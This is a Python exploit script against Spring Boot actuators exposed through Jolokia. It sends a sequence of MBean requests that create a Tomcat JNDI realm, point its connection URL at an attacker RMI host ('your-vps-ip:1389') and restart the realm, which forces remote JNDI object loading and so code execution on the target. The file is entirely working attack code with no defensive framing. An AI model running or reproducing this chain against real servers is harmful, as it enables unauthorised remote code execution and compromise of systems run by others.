#!/usr/bin/env python3
# coding: utf-8
# Referer: https://ricterz.me/posts/2019-03-06-yet-another-way-to-exploit-spring-boot-actuators-via-jolokia.txt


import requests


url = 'http://127.0.0.1:8080/jolokia'


create_realm = {
    "mbean": "Tomcat:type=MBeanFactory",
    "type": "EXEC",
    "operation": "createJNDIRealm",
    "arguments": ["Tomcat:type=Engine"]
}

wirte_factory = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "contextFactory",
    "value": "com.sun.jndi.rmi.registry.RegistryContextFactory"
}

write_url = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "connectionURL",
    "value": "rmi://your-vps-ip:1389/JNDIObject"
}

stop = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "EXEC",
    "operation": "stop",
    "arguments": []
}

start = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "EXEC",
    "operation": "start",
    "arguments": []
}

flow = [create_realm, wirte_factory, write_url, stop, start]

for i in flow:
    print('%s MBean %s: %s ...' % (i['type'].title(), i['mbean'], i.get('operation', i.get('attribute'))))
    r = requests.post(url, json=i)
    r.json()
    print(r.status_code)
